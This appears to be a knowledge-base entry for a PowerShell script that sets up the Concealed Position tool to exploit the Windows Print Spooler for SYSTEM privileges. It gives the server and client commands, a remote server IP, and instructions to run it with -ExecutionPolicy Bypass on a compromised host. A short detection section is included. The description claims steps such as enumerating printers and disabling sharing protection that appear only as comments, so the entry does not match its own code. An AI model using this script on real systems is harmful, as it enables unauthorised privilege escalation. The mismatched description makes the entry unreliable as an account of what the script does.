---
id: 208feb4c-8b75-4618-87e1-9718dda110ce
name: Printer-Spooler-Concealed-Position-Setup-Script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:29.907408+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - spooler
  - setup-script
validated: true
---

# Printer-Spooler-Concealed-Position-Setup-Script

## Code

```powershell
cp_server.exe -e ACIDDAMAGE
# Get-Printer
# Set the "Advanced Sharing Settings" -> "Turn off password protected sharing"
cp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE
cp_client.exe -l -e ACIDDAMAGE
```

## Description

This PowerShell script automates the setup of the Concealed Position tool for Print Spooler privilege escalation. It creates the server, enumerates printers, disables sharing protection, creates the client, and launches it to trigger elevation. Run on a compromised Windows host to gain SYSTEM access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ACIDDAMAGE | Name for server and client (hardcoded; replace in script) | ACIDDAMAGE |
| 10.0.0.9 | Remote server IP for client connection (hardcoded; replace in script) | 10.0.0.9 |

## Usage

Execute the script in PowerShell on the target: `powershell -ExecutionPolicy Bypass -File setup.ps1`. Ensure cp_server.exe and cp_client.exe are in the same directory. This is used in local privilege escalation scenarios after initial foothold.

## Detection

- Monitor for executions of unknown .exe files like cp_server.exe or cp_client.exe in spooler directories.
- Audit PowerShell script block logging for commands involving Get-Printer or netsh advfirewall.
- Watch for changes to sharing settings via Event ID 4946 (rule modification).
- Network logs showing connections to internal IPs on non-standard ports.

## Related

- [[procedures/Printer-Spooler-Service-Elevation-of-Privilege]]
